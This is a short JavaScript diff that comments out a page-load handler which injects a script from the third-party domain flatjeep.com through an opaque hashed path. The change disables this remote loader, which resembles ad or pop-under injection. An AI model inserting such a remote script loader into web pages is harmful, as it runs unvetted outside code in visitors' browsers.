@@ -1,11 +1,11 @@
-document.addEventListener("DOMContentLoaded", () => {
+/* document.addEventListener("DOMContentLoaded", () => {
   if (!document.getElementById("no")) {
     const script = document.createElement("script");
     script.type = "text/javascript";
     script.src = "//flatjeep.com/5e/6b/27/5e6b2776400180cc548a7dfd8ab3f717.js";
     document.body.appendChild(script);
   }
-});
+}); */
 
 // Dynamic
 document.addEventListener("DOMContentLoaded", () => {
